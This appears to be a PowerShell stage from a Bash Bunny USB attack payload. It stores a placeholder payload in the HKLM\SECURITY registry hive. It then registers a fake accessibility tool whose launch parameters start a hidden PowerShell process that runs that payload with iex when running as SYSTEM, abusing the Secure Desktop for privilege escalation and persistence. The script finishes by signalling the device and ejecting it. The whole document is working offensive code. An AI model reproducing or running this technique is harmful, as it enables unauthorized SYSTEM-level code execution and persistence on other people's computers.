$payload = @"
!FINAL_STAGE!
"@

New-Item -Path "HKLM:\SECURITY\Policy" -Name "PolAtnt" -Force
New-ItemProperty -Path "HKLM:\SECURITY\Policy\PolAtnt" -Name "1" -Value $payload -PropertyType "string" -Force

# The final stage is ran in a new orphaned PowerShell process to prevent it from closing when the Secure Desktop closes.
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\atnt" -Name "StartParams" -Value "vbscript:(CreateObject(""WScript.Shell"").Run(""powershell -w 1 -NoP if((whoami) -ne 'NT AUTHORITY\SYSTEM'){exit};([WmiClass]'Win32_Process').Create('powershell -w 1 -NoP iex(gpv HKLM:\SECURITY\Policy\PolAtnt 1)')"",0)(Window.Close))" -PropertyType "String" -Force

#Let the Bash Bunny know we're done here & Eject.
$bb = (gwmi win32_volume -f 'label=''BashBunny''').Name;
New-Item -ItemType file $bb"DONE";
(New-Object -comObject Shell.Application).Namespace(17).ParseName($bb).InvokeVerb("Eject");
